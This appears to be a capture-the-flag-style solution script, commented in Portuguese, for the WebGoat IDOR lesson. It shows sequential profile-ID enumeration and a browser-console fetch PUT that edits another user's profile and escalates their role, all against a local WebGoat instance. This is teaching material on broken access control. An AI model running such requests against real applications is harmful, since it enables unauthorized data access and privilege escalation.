// WebGoat - Insecure Direct Object References (IDOR)
// OWASP: A01 - Broken Access Control
// CWE-284 / CWE-639

// ---------------------------------------------------------------------------
// 1. Login na aplicacao (fora do escopo do script): user = tom / pass = cat
// ---------------------------------------------------------------------------

// 2. Ver o PROPRIO perfil via rota RESTful alternativa (encontrada por padrao):
// Basta navegar direto no navegador para:
//   GET http://127.0.0.1:8080/WebGoat/IDOR/profile/2342384

// ---------------------------------------------------------------------------
// 3. Ver o perfil de OUTRO usuario (Buffalo Bill) trocando o ID sequencialmente:
//   GET http://127.0.0.1:8080/WebGoat/IDOR/profile/2342388
// Resultado obtido: {role=3, color=brown, size=large, name=Buffalo Bill, userId=2342388}
// ---------------------------------------------------------------------------

// ---------------------------------------------------------------------------
// 4. Editar o perfil de OUTRO usuario sem autorizacao (violacao de Integridade)
// Executar no Console do DevTools (F12) com a sessao logada como "tom":
// ---------------------------------------------------------------------------
fetch("http://127.0.0.1:8080/WebGoat/IDOR/profile/2342388", {
  method: "PUT",
  headers: { "Content-Type": "application/json" },
  credentials: "include",
  body: JSON.stringify({
    userId: "2342388",
    role: 1,        // escalonando privilegio (numero menor = privilegio maior)
    color: "red",    // alterando dado do outro usuario sem permissao
    size: "large",
    name: "Buffalo Bill"
  })
}).then(r => r.json()).then(console.log).catch(console.error)

// Resultado esperado: lessonCompleted: true, feedback de sucesso do WebGoat
// confirmando leitura + escrita nao autorizada no perfil de outro usuario.
